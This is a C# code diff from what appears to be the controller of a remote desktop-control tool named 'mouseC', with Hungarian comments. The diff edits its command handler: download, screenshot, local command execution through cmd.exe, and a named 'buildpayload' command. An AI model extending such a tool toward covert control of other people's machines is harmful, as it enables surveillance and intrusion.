@@ -323,6 +323,7 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
                 case "download":
                     if (!CheckTargetEnabled()) break;
                     Send("download");
+                    MessageBox.Show(bemenet);
                     Send(bemenet);
                     break;
                 case "cdme":
@@ -478,7 +479,10 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
 
                 case "screenshot": case "scr":
                     if (!CheckTargetEnabled()) break;
-                    screenShotJon = true;
+                    if (string.IsNullOrEmpty(bemenet))
+                    {
+                        screenShotJon = true;
+                    }
                     Send("screenshot");
                     Send("-");
                     break;
@@ -654,40 +658,44 @@ mouseC       - távolról vezérelhető desktop applikáció       [$célpont sp
 
                 case "cmdme":
                     string texted = "";
-                    try
+                    new Thread(() =>
                     {
-                        // Parancs
-
-                        // Folyamat beállítása
-                        ProcessStartInfo psi = new ProcessStartInfo();
-                        psi.FileName = "cmd.exe";
-                        psi.Arguments = "/c " + bemenet;  // /c = futtatja, majd bezárja a cmd-t
-                        psi.RedirectStandardOutput = true; // ide fogja irányítani a kimenetet
-                        psi.RedirectStandardError = true;  // hibaüzeneteket is lekérheted
-                        psi.UseShellExecute = false;       // kötelező a redirekcióhoz
-                        psi.CreateNoWindow = true;         // ne nyisson új ablakot
-
-                        // Folyamat indítása
-                        using (Process process = Process.Start(psi))
+                        try
                         {
-                            // Kimenet beolvasása
-                            string output = process.StandardOutput.ReadToEnd();
-                            string errors = process.StandardError.ReadToEnd();
+                            // Parancs
 
-                            process.WaitForExit(); // megvárjuk, amíg lefut
-                            Console.WriteLine(output);
-                            texted = output;
+                            // Folyamat beállítása
+                            ProcessStartInfo psi = new ProcessStartInfo();
+                            psi.FileName = "cmd.exe";
+                            psi.Arguments = "/c " + bemenet;  // /c = futtatja, majd bezárja a cmd-t
+                            psi.RedirectStandardOutput = true; // ide fogja irányítani a kimenetet
+                            psi.RedirectStandardError = true;  // hibaüzeneteket is lekérheted
+                            psi.UseShellExecute = false;       // kötelező a redirekcióhoz
+                            psi.CreateNoWindow = true;         // ne nyisson új ablakot
 
-                            if (!string.IsNullOrEmpty(errors))
+                            // Folyamat indítása
+                            using (Process process = Process.Start(psi))
                             {
-                                texted = errors;
+                                // Kimenet beolvasása
+                                string output = process.StandardOutput.ReadToEnd();
+                                string errors = process.StandardError.ReadToEnd();
+
+                                process.WaitForExit(); // megvárjuk, amíg lefut
+                                Console.WriteLine(output);
+                                texted = output;
+
+                                if (!string.IsNullOrEmpty(errors))
+                                {
+                                    texted = errors;
+                                }
                             }
                         }
-                    }
-                    catch (Exception)
-                    {
-                        Log($"[$!$] [$Console hiba$]");
-                    }
+                        catch (Exception)
+                        {
+                            Log($"[$!$] [$Console hiba$]");
+                        }
+                    }).Start();
+                    
                     break;
 
                 case "buildpayload":
